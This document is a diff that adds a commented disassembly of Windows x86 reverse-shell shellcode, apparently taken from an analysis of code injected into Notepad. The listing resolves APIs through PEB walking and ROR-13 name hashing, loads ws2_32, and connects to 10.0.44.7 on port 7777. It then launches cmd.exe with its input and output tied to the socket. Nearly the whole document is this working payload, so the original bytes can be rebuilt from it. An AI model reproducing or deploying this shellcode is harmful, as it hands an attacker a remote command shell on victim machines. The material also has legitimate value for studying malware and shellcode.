@@ -1,0 +1,190 @@
+00440000 fc              cld
+00440001 e882000000      call    00440088
+00440006 60              pushad
+00440007 89e5            mov     ebp,esp
+00440009 31c0            xor     eax,eax
+0044000b 648b5030        mov     edx,dword ptr fs:[eax+30h]
+0044000f 8b520c          mov     edx,dword ptr [edx+0Ch]
+00440012 8b5214          mov     edx,dword ptr [edx+14h]
+00440015 8b7228          mov     esi,dword ptr [edx+28h]	// _LDR_DATA_TABLE_ENTRY.FullDllName.Buffer
+00440018 0fb74a26        movzx   ecx,word ptr [edx+26h]
+0044001c 31ff            xor     edi,edi
+
+
+
+0044001e ac              lods    byte ptr [esi]
+0044001f 3c61            cmp     al,61h
+00440021 7c02            jl      00440025
+00440023 2c20            sub     al,20h
+00440025 c1cf0d          ror     edi,0Dh
+00440028 01c7            add     edi,eax
+0044002a e2f2            loop    0044001e
+
+
+
+
+0044002c 52              push    edx
+0044002d 57              push    edi
+0044002e 8b5210          mov     edx,dword ptr [edx+10h]
+
+
+// Notepad module
+00440031 8b4a3c          mov     ecx,dword ptr [edx+3Ch]		
+00440034 8b4c1178        mov     ecx,dword ptr [ecx+edx+78h]	// points to exports
+
+
+
+00440038 e348            jecxz   00440082				// (j-ecx-z) jmp if ecx = 0, ecx should contains exports
+0044003a 01d1            add     ecx,edx
+0044003c 51              push    ecx
+0044003d 8b5920          mov     ebx,dword ptr [ecx+20h]	// ebx = AddressOfNames (37b94 - 1000 + 400 = 36f94)
+00440040 01d3            add     ebx,edx
+00440042 8b4918          mov     ecx,dword ptr [ecx+18h]	// ecx = NumberOfNames
+00440045 e33a            jecxz   00440081
+00440047 49              dec     ecx
+00440048 8b348b          mov     esi,dword ptr [ebx+ecx*4]	// for each AddressOfNames
+0044004b 01d6            add     esi,edx
+0044004d 31ff            xor     edi,edi
+0044004f ac              lods    byte ptr [esi]
+00440050 c1cf0d          ror     edi,0Dh
+00440053 01c7            add     edi,eax
+00440055 38e0            cmp     al,ah
+00440057 75f6            jne     0044004f
+00440059 037df8          add     edi,dword ptr [ebp-8]
+0044005c 3b7d24          cmp     edi,dword ptr [ebp+24h]
+0044005f 75e4            jne     00440045
+00440061 58              pop     eax
+00440062 8b5824          mov     ebx,dword ptr [eax+24h]
+00440065 01d3            add     ebx,edx
+00440067 668b0c4b        mov     cx,word ptr [ebx+ecx*2]
+0044006b 8b581c          mov     ebx,dword ptr [eax+1Ch]
+0044006e 01d3            add     ebx,edx
+00440070 8b048b          mov     eax,dword ptr [ebx+ecx*4]
+00440073 01d0            add     eax,edx
+00440075 89442424        mov     dword ptr [esp+24h],eax
+00440079 5b              pop     ebx
+0044007a 5b              pop     ebx
+0044007b 61              popad
+0044007c 59              pop     ecx
+0044007d 5a              pop     edx
+0044007e 51              push    ecx
+0044007f ffe0            jmp     eax		// Lookup of API and call
+
+
+00440081 5f              pop     edi
+00440082 5f              pop     edi
+00440083 5a              pop     edx
+00440084 8b12            mov     edx,dword ptr [edx]
+00440086 eb8d            jmp     00440015
+00440088 5d              pop     ebp
+
+
+00440089 6833320000      push    3233h		// 32
+0044008e 687773325f      push    5F327377h	// ws2_
+00440093 54              push    esp
+00440094 684c772607      push    726774Ch		// LoadLibraryExA ws2_32
+00440099 ffd5            call    ebp		
+
+
+0044009b b890010000      mov     eax,190h
+004400a0 29c4            sub     esp,eax
+
+004400a2 54              push    esp
+004400a3 50              push    eax
+004400a4 6829806b00      push    6B8029h		// WSAStartup
+004400a9 ffd5            call    ebp		
+
+
+004400ab 50              push    eax
+004400ac 50              push    eax
+004400ad 50              push    eax
+004400ae 50              push    eax
+004400af 40              inc     eax
+004400b0 50              push    eax
+004400b1 40              inc     eax
+004400b2 50              push    eax
+004400b3 68ea0fdfe0      push    0E0DF0FEAh	// WSASocketA
+004400b8 ffd5            call    ebp		
+
+
+
+004400ba 97              xchg    eax,edi
+004400bb 6a05            push    5
+004400bd 680a002c07      push    72C000Ah		// IP 10.0.44.7
+004400c2 6802001e61      push    611E0002h	// PORT 7777 (1e61) + AF_INET = 2
+004400c7 89e6            mov     esi,esp
+004400c9 6a10            push    10h
+004400cb 56              push    esi
+004400cc 57              push    edi
+004400cd 6899a57461      push    6174A599h	// connect
+004400d2 ffd5            call    ebp		
+
+
+
+
+004400d4 85c0            test    eax,eax
+004400d6 740c            je      004400e4
+004400d8 ff4e08          dec     dword ptr [esi+8]
+004400db 75ec            jne     004400c9
+
+
+004400dd 68f0b5a256      push    56A2B5F0h
+004400e2 ffd5            call    ebp
+
+
+004400e4 68636d6400      push    646D63h
+004400e9 89e3            mov     ebx,esp
+004400eb 57              push    edi
+004400ec 57              push    edi
+004400ed 57              push    edi
+004400ee 31f6            xor     esi,esi
+004400f0 6a12            push    12h
+004400f2 59              pop     ecx
+004400f3 56              push    esi
+004400f4 e2fd            loop    004400f3
+004400f6 66c744243c0101  mov     word ptr [esp+3Ch],101h
+004400fd 8d442410        lea     eax,[esp+10h]
+00440101 c60044          mov     byte ptr [eax],44h
+00440104 54              push    esp
+00440105 50              push    eax
+00440106 56              push    esi
+00440107 56              push    esi
+00440108 56              push    esi
+00440109 46              inc     esi
+0044010a 56              push    esi
+0044010b 4e              dec     esi
+0044010c 56              push    esi
+0044010d 56              push    esi
+0044010e 53              push    ebx
+0044010f 56              push    esi		
+00440110 6879cc3f86      push    863FCC79h	// CreateProcessA (cmd)
+00440115 ffd5            call    ebp
+
+
+00440117 89e0            mov     eax,esp
+00440119 4e              dec     esi
+0044011a 56              push    esi
+0044011b 46              inc     esi
+
+
+0044011c ff30            push    dword ptr [eax]
+0044011e 6808871d60      push    601D8708h	// WaitForSingleObject
+00440123 ffd5            call    ebp
+
+
+00440125 bbf0b5a256      mov     ebx,56A2B5F0h
+0044012a 68a695bd9d      push    9DBD95A6h
+0044012f ffd5            call    ebp
+
+
+00440131 3c06            cmp     al,6
+00440133 7c0a            jl      0044013f
+00440135 80fbe0          cmp     bl,0E0h
+00440138 7505            jne     0044013f
+0044013a bb4713726f      mov     ebx,6F721347h
+0044013f 6a00            push    0
+00440141 53              push    ebx
+00440142 ffd5            call    ebp
+
+
+00440144 0000            add     byte ptr [eax],al
